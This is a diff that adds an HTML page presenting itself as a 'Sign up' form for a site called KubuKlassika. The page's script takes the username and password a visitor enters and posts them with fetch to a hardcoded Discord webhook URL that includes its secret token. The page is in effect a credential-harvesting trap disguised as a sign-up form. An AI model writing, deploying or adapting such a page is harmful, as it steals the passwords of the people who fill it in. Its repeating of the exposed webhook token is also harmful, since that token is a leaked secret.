@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Send Message to Discord</title>
+  </head>
+  <body style="background-color:#1c87c9;">
+<h2>Sign up</h2>
+<hr>
+    <form id="discord-form">
+      <label for="credentials">Username:</label><br>
+      <input type="text" id="credentials" name="credentials" required><br>
+      <label for="message">Password:</label><br>
+      <input type="password" id="message" name="message" maxlength="500" required><br>
+      
+      <input type="submit" value="Send">
+    </form>
+
+    <script defer>
+      const form = document.getElementById("discord-form");
+
+      form.addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const credentials = document.getElementById("credentials").value;
+        const [username, password] = credentials.split(":");
+        const message = document.getElementById("message").value;
+
+        if (message.trim() === "") {
+          alert("Cannot send an empty message");
+          return;
+        }
+
+        const data = new FormData();
+        data.append("username", username);
+        data.append("password", password);
+        data.append("content", message);
+
+        fetch("https://discord.com/api/webhooks/1232953686322446337/4LZGkLR_mbnCIjO8YVSL0V1mElDKkeamFYz4tw-NzqYtBkr06nmMifh9ZLI3sjf2nuJJ", {
+          method: "POST",
+          body: data
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("Failed to send message to Discord");
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log("Message sent to Discord:", data);
+        })
+        .catch(error => {
+          console.error("Error sending message to Discord:", error);
+        });
+      });
+    </script>
+<hr>
+<p> Hello welcome to KubuKlassika site - Qormi71 </p>
+<hr>
+<h3>Users</h3>
+<p> - Qormi71 </p>
+  </body>
+</html>
